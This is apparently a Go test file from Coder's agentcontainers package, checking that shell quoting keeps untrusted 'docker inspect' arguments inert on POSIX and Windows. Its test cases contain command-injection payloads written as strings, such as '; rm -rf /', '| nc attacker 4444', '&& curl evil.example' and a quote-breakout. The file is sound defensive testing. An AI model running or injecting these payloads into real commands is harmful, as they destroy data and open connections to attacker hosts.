package agentcontainers

import (
	"context"
	"os/exec"
	"runtime"
	"testing"

	"github.com/stretchr/testify/require"

	"cdr.dev/slog/v3"
	"cdr.dev/slog/v3/sloggers/slogtest"
	"github.com/coder/coder/v2/agent/usershell"
	"github.com/coder/coder/v2/pty"
)

func TestShellQuote(t *testing.T) {
	t.Parallel()

	tests := []struct {
		name string
		in   string
		want string
	}{
		{name: "Empty", in: "", want: `''`},
		{name: "Plain", in: "docker", want: `'docker'`},
		{name: "CommandSubstitution", in: "$(touch /tmp/pwn)", want: `'$(touch /tmp/pwn)'`},
		{name: "Backticks", in: "`id`", want: "'`id`'"},
		{name: "DollarVar", in: "$HOME", want: `'$HOME'`},
		{name: "Semicolon", in: "; rm -rf /", want: `'; rm -rf /'`},
		{name: "Pipe", in: "| nc attacker 4444", want: `'| nc attacker 4444'`},
		{name: "Ampersand", in: "&& curl evil.example", want: `'&& curl evil.example'`},
		{name: "SingleQuote", in: "it's", want: `'it'\''s'`},
		{name: "DoubleQuote", in: `say "hi"`, want: `'say "hi"'`},
		{name: "Backslash", in: `a\b`, want: `'a\b'`},
		{name: "GoTemplate", in: "{{.Names}}", want: `'{{.Names}}'`},
		{name: "Newline", in: "a\nb", want: "'a\nb'"},
		{name: "AdjacentSingleQuotes", in: "a''b", want: `'a'\'''\''b'`},
		{name: "OnlySingleQuotes", in: "''", want: `''\'''\'''`},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			require.Equal(t, tt.want, shellQuote(tt.in))
		})
	}
}

type recordingExecer struct {
	commands [][]string
}

func (r *recordingExecer) CommandContext(ctx context.Context, cmd string, args ...string) *exec.Cmd {
	r.commands = append(r.commands, append([]string{cmd}, args...))
	// No-op command so callers can safely set Dir/Env.
	return exec.CommandContext(ctx, "true")
}

func (*recordingExecer) PTYCommandContext(_ context.Context, _ string, _ ...string) *pty.Cmd {
	panic("not implemented")
}

func TestCommandEnvExecer_PrepareQuotesUntrustedArgs(t *testing.T) {
	t.Parallel()

	if runtime.GOOS == "windows" {
		t.Skip("POSIX single-quote behavior; see TestCommandEnvExecer_PrepareQuotesUntrustedArgsWindows")
	}

	cases := []struct {
		name    string
		payload string
		// wantScript is the exact third argument the executer must pass
		// to the shell. It is the joined, single-quoted form of
		// {"docker", "inspect", payload}.
		wantScript string
	}{
		{
			name:       "CommandSubstitution",
			payload:    "$(touch /tmp/pwn)",
			wantScript: `'docker' 'inspect' '$(touch /tmp/pwn)'`,
		},
		{
			name:       "Backticks",
			payload:    "`id`",
			wantScript: "'docker' 'inspect' '`id`'",
		},
		{
			name:       "DollarVar",
			payload:    "$HOME",
			wantScript: `'docker' 'inspect' '$HOME'`,
		},
		{
			name:       "Semicolon",
			payload:    "; touch /tmp/pwn",
			wantScript: `'docker' 'inspect' '; touch /tmp/pwn'`,
		},
		{
			name:       "Pipe",
			payload:    "| nc attacker 4444",
			wantScript: `'docker' 'inspect' '| nc attacker 4444'`,
		},
		{
			name:       "SingleQuoteBreakout",
			payload:    "x'; touch /tmp/pwn; '",
			wantScript: `'docker' 'inspect' 'x'\''; touch /tmp/pwn; '\'''`,
		},
		{
			name:       "GoTemplate",
			payload:    "{{.Names}}",
			wantScript: `'docker' 'inspect' '{{.Names}}'`,
		},
		{
			name:       "Newline",
			payload:    "a\nrm -rf /",
			wantScript: "'docker' 'inspect' 'a\nrm -rf /'",
		},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()

			rec := &recordingExecer{}
			logger := slogtest.Make(t, nil).Leveled(slog.LevelDebug)
			ce := func(usershell.EnvInfoer, []string) (string, string, []string, error) {
				return "/bin/bash", "/tmp", []string{"PATH=/usr/bin"}, nil
			}
			e := newCommandEnvExecer(logger, ce, rec)

			cmd := e.CommandContext(t.Context(), "docker", "inspect", tc.payload)
			require.NotNil(t, cmd, "CommandContext must return a non-nil *exec.Cmd")
			require.Equal(t, "/tmp", cmd.Dir, "Dir from CommandEnv should be propagated")
			require.Equal(t, []string{"PATH=/usr/bin"}, cmd.Env, "Env from CommandEnv should be propagated")

			require.Len(t, rec.commands, 1, "exactly one command should be recorded")
			require.Equal(t,
				[]string{"/bin/bash", "-c", tc.wantScript},
				rec.commands[0],
				"shell, -c flag, and fully single-quoted script must match exactly",
			)
		})
	}
}

func TestCommandEnvExecer_PrepareQuotesUntrustedArgsWindows(t *testing.T) {
	t.Parallel()

	if runtime.GOOS != "windows" {
		t.Skip("Windows-only; see TestCommandEnvExecer_PrepareQuotesUntrustedArgs for the POSIX equivalent")
	}

	cases := []struct {
		name       string
		payload    string
		wantScript string
	}{
		{
			name:       "CommandSubstitution",
			payload:    "$(touch /tmp/pwn)",
			wantScript: `"docker" "inspect" "$(touch /tmp/pwn)"`,
		},
		{
			name:       "Backticks",
			payload:    "`id`",
			wantScript: "\"docker\" \"inspect\" \"`id`\"",
		},
		{
			name:       "DollarVar",
			payload:    "$HOME",
			wantScript: `"docker" "inspect" "$HOME"`,
		},
		{
			name:       "PercentVar",
			payload:    "%USERPROFILE%",
			wantScript: `"docker" "inspect" "%USERPROFILE%"`,
		},
		{
			name:       "Semicolon",
			payload:    "; touch /tmp/pwn",
			wantScript: `"docker" "inspect" "; touch /tmp/pwn"`,
		},
		{
			name:       "Pipe",
			payload:    "| nc attacker 4444",
			wantScript: `"docker" "inspect" "| nc attacker 4444"`,
		},
		{
			name:       "Ampersand",
			payload:    "& whoami",
			wantScript: `"docker" "inspect" "& whoami"`,
		},
		{
			name:       "DoubleQuote",
			payload:    `say "hi"`,
			wantScript: `"docker" "inspect" "say \"hi\""`,
		},
		{
			name:       "GoTemplate",
			payload:    "{{.Names}}",
			wantScript: `"docker" "inspect" "{{.Names}}"`,
		},
		{
			name:       "Newline",
			payload:    "a\nrm -rf /",
			wantScript: `"docker" "inspect" "a\nrm -rf /"`,
		},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()

			rec := &recordingExecer{}
			logger := slogtest.Make(t, nil).Leveled(slog.LevelDebug)
			ce := func(usershell.EnvInfoer, []string) (string, string, []string, error) {
				return `C:\Windows\System32\cmd.exe`, `C:\`, []string{"PATH=C:\\Windows\\System32"}, nil
			}
			e := newCommandEnvExecer(logger, ce, rec)

			cmd := e.CommandContext(t.Context(), "docker", "inspect", tc.payload)
			require.NotNil(t, cmd, "CommandContext must return a non-nil *exec.Cmd")
			require.Equal(t, `C:\`, cmd.Dir, "Dir from CommandEnv should be propagated")
			require.Equal(t, []string{"PATH=C:\\Windows\\System32"}, cmd.Env, "Env from CommandEnv should be propagated")

			require.Len(t, rec.commands, 1, "exactly one command should be recorded")
			require.Equal(t,
				[]string{`C:\Windows\System32\cmd.exe`, "/c", tc.wantScript},
				rec.commands[0],
				"shell, /c flag, and Go-quoted script must match exactly",
			)
		})
	}
}
